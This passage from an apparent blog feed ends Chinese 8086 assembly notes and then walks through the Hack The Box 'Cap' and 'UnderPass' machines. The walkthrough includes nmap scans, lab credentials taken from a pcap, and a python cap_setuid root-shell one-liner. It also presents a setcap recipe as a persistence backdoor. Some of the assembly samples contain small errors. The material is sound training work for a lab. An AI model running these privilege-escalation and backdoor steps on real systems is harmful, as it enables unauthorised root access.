CMOS RAM 的 2 号单元<ul><li>将 2 送入端口 70h</li><li>从端口 70h 读出 2 号单元的内容</li></ul></li></ul><h3 id="14-3-shl-和-shr-指令"><a href="#14-3-shl-和-shr-指令" class="headerlink" title="14.3 shl 和 shr 指令"></a>14.3 shl 和 shr 指令</h3><p>shl 是逻辑左移指令</p><ul><li>将一个寄存器或内存单元中的数据向左移位</li><li>将最后移出的一位写入 CF 中</li><li>最低位用 0 补充</li></ul><p>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01001000b<br>shl al,1//左移 1 位<br>//(al)=10010000b<br></code></pre></td></tr></table></figure><p><strong>如果移动位数大于 1 时，必须将移动位数放在 cl 中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01010001b<br>mov cl,3<br>shl,al,cl<br>//执行后 (al)=10001000b,最后移出的一位是 0,所以 CF=0<br></code></pre></td></tr></table></figure><p>shr 是逻辑右移指令</p><ul><li>向右移位</li><li>最后移出的一位写入 CF 中</li><li>最高位用 0 补充</li></ul><p>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,10000001b<br>shr al,1//右移<br>//(al)=01000000b,CF =1<br></code></pre></td></tr></table></figure><p>e.g 用加法和移位指令计算 (ax)&#x3D;(ax)*10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>start:mov bx,ax<br>shl,ax,1<br>mov cl,3<br>shl bx,cl//左移 3 位,(bx)=(ax)*8<br>add ax,bx//(ax)=(ax)*2+(ax)*8<br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br><br></code></pre></td></tr></table></figure><h1 id="十五、外中断"><a href="#十五、外中断" class="headerlink" title="十五、外中断"></a>十五、外中断</h1><h3 id="15-2-外中断信息"><a href="#15-2-外中断信息" class="headerlink" title="15.2 外中断信息"></a>15.2 外中断信息</h3><p>1）可屏蔽中断</p><p>CPU 可以不响应的外中断，如果 IF &#x3D; 0，CPU 可以不响应可屏蔽中断</p><p>sti ,设置 IF &#x3D;1</p><p>cli ,设置 IF &#x3D;0</p><p><strong>几乎所有由外设引发的中断都是可屏蔽中断</strong></p><p>2）不可屏蔽中断</p><p>对于 8086CPU ，不可屏蔽中断类型码固定为2，所以中断过程中，不需要取中断类型码，过程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">标志寄存器入,IF=0,TF=0<br>CS、IP 入栈<br>(IP)=(8),(CS)=(0AH0)<br></code></pre></td></tr></table></figure><h1 id="指令系统总结"><a href="#指令系统总结" class="headerlink" title="指令系统总结"></a>指令系统总结</h1><h3 id="1-数据传送指令"><a href="#1-数据传送指令" class="headerlink" title="1. 数据传送指令"></a>1. 数据传送指令</h3><p>mov 、sub 、push、pop、pushf、popf、xchg等都是数据传送指令，实现寄存器和内存、寄存器和寄存器之间的单个数据传送</p><h3 id="2-算术运算指令"><a href="#2-算术运算指令" class="headerlink" title="2. 算术运算指令"></a>2. 算术运算指令</h3><p>add、sub、adc、sbb、inc、dec、cmp、imul、idiv、aaa等，实现寄存器和内存中的数据的算数运算，执行结果影响寄存器的 sf、zf、of、cf、pf、af位</p><h3 id="3-逻辑指令"><a href="#3-逻辑指令" class="headerlink" title="3. 逻辑指令"></a>3. 逻辑指令</h3><p>add、or、not、xor、test、shl、shr、sal、sar、rol、ror、rcl、rcr等，除了 not 外，执行结果都影响标志寄存器的相关标志位</p><h3 id="4-转移指令"><a href="#4-转移指令" class="headerlink" title="4. 转移指令"></a>4. 转移指令</h3><p>可以修改 IP ，或者同时修改 CS 和 IP</p><p>1）无条件转移指令，比如，jmp</p><p>2）条件转移指令，比如，jcxz，je，jb，ja，jnb，jna等</p><p>3）循环指令，比如，loop</p><p>4）过程，比如，call、ret、retf</p><p>5）中断，比如，int、iret</p><h3 id="5-处理机控制指令"><a href="#5-处理机控制指令" class="headerlink" title="5. 处理机控制指令"></a>5. 处理机控制指令</h3><p>cld、std、cli、sti、nop、clc、cmc、stc、hlt、wait、esc、lock等</p><h3 id="6-串处理指令"><a href="#6-串处理指令" class="headerlink" title="6. 串处理指令"></a>6. 串处理指令</h3><p>movsb、movsw、cmps、scas、lods、stos等，可搭配 rep、repe、repne等使用</p><h1 id="十六、直接定址表"><a href="#十六、直接定址表" class="headerlink" title="十六、直接定址表"></a>十六、直接定址表</h1><h3 id="16-2-在其他段中使用数据标号"><a href="#16-2-在其他段中使用数据标号" class="headerlink" title="16.2 在其他段中使用数据标号"></a>16.2 在其他段中使用数据标号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>a db 1,2,3,4,5,6,7,8<br>b dw 0<br>c dd a,b<br>data ends<br></code></pre></td></tr></table></figure><p>标号 c 处存储的两个双字节型数据为标号 a 的偏移地址和段地址、标号 b 的偏移地址和段地址 ,相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>a db 1,2,3,4,5,6,7,8<br>b dw 0<br>c dw offset a,seg a,offset b,seg b<br>data ends<br>//seg 操作符，功能为取得某一标号的段地址<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Cap &amp; UnderPass</title>
    <link href="/2025/03/12/HTB-Cap-UnderPass/"/>
    <url>/2025/03/12/HTB-Cap-UnderPass/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/HTB/Machine/Cap]<br>└─# nmap -p- -T4 --min-rate=<span class="hljs-number">1000</span> -sS -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">11</span> <span class="hljs-number">14</span>:<span class="hljs-number">39</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">30</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">65532</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp open  ftp<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">86</span>.<span class="hljs-number">05</span> seconds<br></code></pre></td></tr></table></figure><p>开着 21、22、80</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:3<br></code></pre></td></tr></table></figure><h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><p>访问 80 端口，侧边栏找到 <code>Security Snapshot</code> ，查看 url</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">After running <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;Security Snapshot&quot;</span>, <span class="hljs-keyword">the</span> browser is redirected <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> path <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">format</span> /[something]/[id], where [id] represents <span class="hljs-keyword">the</span> id <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> scan. What is <span class="hljs-keyword">the</span> [something]?<br>:data<br></code></pre></td></tr></table></figure><h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><p>查看侧边栏的 <code>Network Status</code> 发现还有其他 IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/a8fafe0bc546ec32.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Are you able <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> <span class="hljs-keyword">to</span> other users<span class="hljs-string">&#x27; scans?</span><br><span class="hljs-string">:yes</span><br></code></pre></td></tr></table></figure><h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> ID <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> PCAP <span class="hljs-built_in">file</span> <span class="hljs-keyword">that</span> <span class="hljs-keyword">contains</span> sensative data?<br>:<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h2><p>在 <code>http://10.10.10.245/data/0</code> 下载数据包</p><p><img src="https://img.dkdun.cn/v1/2025/12/8f2ffd0671c11359.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which application layer protocol <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> pcap <span class="hljs-built_in">file</span> can <span class="hljs-keyword">the</span> sensetive data be found <span class="hljs-keyword">in</span>?<br>:<span class="hljs-keyword">ftp</span><br></code></pre></td></tr></table></figure><h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">USER</span> <span class="hljs-title">nathan</span><br>PASS Buck3tH4TF0RM3!<br></code></pre></td></tr></table></figure><p>ssh 也能用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">W<span class="hljs-string">e&#x27;ve managed to collect nathan&#x27;</span>s FTP <span class="hljs-keyword">password</span>. <span class="hljs-keyword">On</span> what other service does this <span class="hljs-keyword">password</span> <span class="hljs-keyword">work</span>?<br>:ssh<br></code></pre></td></tr></table></figure><h2 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ftp <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>get user.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/752db83161eb57c2.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in the nathan user&#x27;s home directory.<br>:<span class="hljs-number">12298311</span>c<span class="hljs-number">4131</span>1a3b59b<span class="hljs-number">4887</span>9e6c07ff<br></code></pre></td></tr></table></figure><h2 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h2><p>传一个 <code>linpeas.sh</code> 上去，在 <code>Capabilities</code> 下看到了 <code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/957af3fac15cccef.png"></p><p>还可以直接查找</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">getcap -r / <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">full</span> <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> the binary <span class="hljs-keyword">on</span> this machine has special capabilities that can be abused <span class="hljs-keyword">to</span> obtain root <span class="hljs-keyword">privileges</span>?<br>:/usr/bin/python3<span class="hljs-number">.8</span><br></code></pre></td></tr></table></figure><h2 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h2><p>执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3<span class="hljs-number">.8</span> -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>进入 root 权限</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in root&#x27;s home directory.<br>:<span class="hljs-number">07860203</span>4d5abb<span class="hljs-number">9587</span>c86b9f<span class="hljs-number">7560</span>ab18<br></code></pre></td></tr></table></figure><h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p><p>如果二进制文件具有 Linux <code>CAP_SETUID</code> 功能集或者具有功能集的另一个二进制文件执行，可以用作后门，通过操作自己的进程 UID 来维持权限访问</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">cp $(which python) .<br>sudo setcap cap_setuid+ep python<br><br>./python -c &#x27;import os; os.setuid(<span class="hljs-number">0</span>); os.system(&quot;/bin/sh&quot;)&#x27;<br></code></pre></td></tr></table></figure><p><code>Capabilities</code> 机制在 Linux 内核 2.2 之后引入，它将 root 用户权限细分为不同领域，可以禁用或启用。如果 euid 不是 root ，那么会检查是否具有特权操作所对应的 <code>Capabilities</code>，以此为依据来决定是否能执行权限操作，主要是针对 SUID 的权限控制</p><p>上述的 <code>CAP_SETUID</code> 就是改变进程的 uid(setuid(),setreuid(),setresuid() 等等) 对应的 capability </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os; os.setuid(<span class="hljs-number">0</span>); os.system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br></code></pre></td></tr></table></figure><p>更多详情可以看大佬们的博客：<a href="https://www.cnblogs.com/f-carey/p/16026088.html%EF%BC%8Chttps://rk700.github.io/2016/10/26/linux-capabilities/">https://www.cnblogs.com/f-carey/p/16026088.html，https://rk700.github.io/2016/10/26/linux-capabilities/</a></p><h1 id="UnderPass"><a href="#UnderPass" class="headerlink" title="UnderPass"></a>UnderPass</h1><h2 id="Submit-User-Flag-1"><a href="#Submit-User-Flag-1" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# nmap -sS -sV -Pn -A <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">12</span> <span class="hljs-number">17</span>:<span class="hljs-number">14</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">33</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br>| ssh-hostkey:<br>|   <span class="hljs-number">256</span> <span class="hljs-number">48</span>:b0:d2:c7:<span class="hljs-number">29</span>:<span class="hljs-number">26</span>:ae:<span class="hljs-number">3</span>d:fb:b7:<span class="hljs-number">6</span>b:<span class="hljs-number">0</span>f:f5:<span class="hljs-number">4</span>d:<span class="hljs-number">2</span>a:ea (ECDSA)<br>|_  <span class="hljs-number">256</span> cb:<span class="hljs-number">61</span>:<span class="hljs-number">64</span>:b8:<span class="hljs-number">1</span>b:<span class="hljs-number">1</span>b:b5:ba:b8:<span class="hljs-number">45</span>:<span class="hljs-number">86</span>:c5:<span class="hljs-number">16</span>:bb:e2:a2 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span> ((Ubuntu))<br>|_http-server-header: Apache/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span> (Ubuntu)<br>|_http-<span class="hljs-built_in">title</span>: Apache2 Ubuntu Default Page: It works<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-keyword">If</span> you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br><span class="hljs-function">OS:<span class="hljs-title">SCAN</span>(<span class="hljs-title">V</span>=7.94<span class="hljs-title">SVN</span>%<span class="hljs-title">E</span>=4%<span class="hljs-title">D</span>=3/12%<span class="hljs-title">OT</span>=22%<span class="hljs-title">CT</span>=1%<span class="hljs-title">CU</span>=41673%<span class="hljs-title">PV</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DS</span>=3%<span class="hljs-title">DC</span>=<span class="hljs-title">T</span>%<span class="hljs-title">G</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">TM</span>=67<span class="hljs-title">D1</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:50<span class="hljs-title">C6</span>%<span class="hljs-title">P</span>=<span class="hljs-title">x86_64</span>-<span class="hljs-title">pc</span>-<span class="hljs-title">linux</span>-<span class="hljs-title">gnu</span>)<span class="hljs-title">SEQ</span>(<span class="hljs-title">SP</span>=<span class="hljs-title">FF</span>%<span class="hljs-title">GCD</span>=1%<span class="hljs-title">ISR</span>=106%<span class="hljs-title">TI</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">CI</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">II</span>=<span class="hljs-title">I</span>%<span class="hljs-title">TS</span>=<span class="hljs-title">A</span>)<span class="hljs-title">O</span></span><br><span class="hljs-function"><span class="hljs-title">OS:PS</span>(<span class="hljs-title">O1</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O2</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O3</span>=<span class="hljs-title">M53ANNT11NW7</span>%<span class="hljs-title">O4</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O5</span>=<span class="hljs-title">M53AS</span></span><br><span class="hljs-function"><span class="hljs-title">OS:T11NW7</span>%<span class="hljs-title">O6</span>=<span class="hljs-title">M53AST11</span>)<span class="hljs-title">WIN</span>(<span class="hljs-title">W1</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W2</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W3</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W4</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W5</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W6</span>=<span class="hljs-title">FE88</span>)<span class="hljs-title">E</span></span><br><span class="hljs-function"><span class="hljs-title">OS:CN</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=<span class="hljs-title">FAF0</span>%<span class="hljs-title">O</span>=<span class="hljs-title">M53ANNSNW7</span>%<span class="hljs-title">CC</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">Q</span>=)<span class="hljs-title">T1</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">S</span>=<span class="hljs-title">O</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:=<span class="hljs-title">AS</span>%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T2</span>(<span class="hljs-title">R</span>=<span class="hljs-title">N</span>)<span class="hljs-title">T3</span>(<span class="hljs-title">R</span>=<span class="hljs-title">N</span>)<span class="hljs-title">T4</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">A</span>%<span class="hljs-title">A</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">F</span>=<span class="hljs-title">R</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T5</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span>=<span class="hljs-title">AR</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T6</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">A</span>%<span class="hljs-title">A</span>=<span class="hljs-title">Z</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:%<span class="hljs-title">F</span>=<span class="hljs-title">R</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T7</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span>=<span class="hljs-title">AR</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">U1</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=</span><br><span class="hljs-function"><span class="hljs-title">OS:N</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">IPL</span>=164%<span class="hljs-title">UN</span>=0%<span class="hljs-title">RIPL</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RID</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RIPCK</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RUCK</span>=<span class="hljs-title">EAE7</span>%<span class="hljs-title">RUD</span>=<span class="hljs-title">G</span>)<span class="hljs-title">IE</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DFI</span>=<span class="hljs-title">N</span>%<span class="hljs-title">T</span>=</span><br><span class="hljs-function"><span class="hljs-title">OS</span>:40%<span class="hljs-title">CD</span>=<span class="hljs-title">S</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Network</span> <span class="hljs-title">Distance</span>: 3 <span class="hljs-title">hops</span></span><br><span class="hljs-function"><span class="hljs-title">Service</span> <span class="hljs-title">Info</span>: <span class="hljs-title">OS</span>: <span class="hljs-title">Linux</span>; <span class="hljs-title">CPE</span>: <span class="hljs-title">cpe</span>:/<span class="hljs-title">o:linux</span>:<span class="hljs-title">linux_kernel</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">TRACEROUTE</span> (<span class="hljs-title">using</span> <span class="hljs-title">port</span> 3389/<span class="hljs-title">tcp</span>)</span><br><span class="hljs-function"><span class="hljs-title">HOP</span> <span class="hljs-title">RTT</span>       <span class="hljs-title">ADDRESS</span></span><br><span class="hljs-function">1   0.27 <span class="hljs-title">ms</span>   172.30.144.1</span><br><span class="hljs-function">2   369.92 <span class="hljs-title">ms</span> 10.10.16.1</span><br><span class="hljs-function">3   370.15 <span class="hljs-title">ms</span> 10.10.11.48</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">OS</span> <span class="hljs-title">and</span> <span class="hljs-title">Service</span> <span class="hljs-title">detection</span> <span class="hljs-title">performed</span>. <span class="hljs-title">Please</span> <span class="hljs-title">report</span> <span class="hljs-title">any</span> <span class="hljs-title">incorrect</span> <span class="hljs-title">results</span> <span class="hljs-title">at</span> <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">submit</span>/ .</span><br><span class="hljs-function"><span class="hljs-title">Nmap</span> <span class="hljs-title">done</span>: 1 <span class="hljs-title">IP</span> <span class="hljs-title">address</span> (1 <span class="hljs-title">host</span> <span class="hljs-title">up</span>) <span class="hljs-title">scanned</span> <span class="hljs-title">in</span> 52.86 <span class="hljs-title">seconds</span></span><br></code></pre></td></tr></table></figure><p>开了 http 和 ssh</p><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>访问 http 服务，什么都没有</p><p><img src="https://img.dkdun.cn/v1/2025/12/9bf9e7ad7d96c4e2.png"></p><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 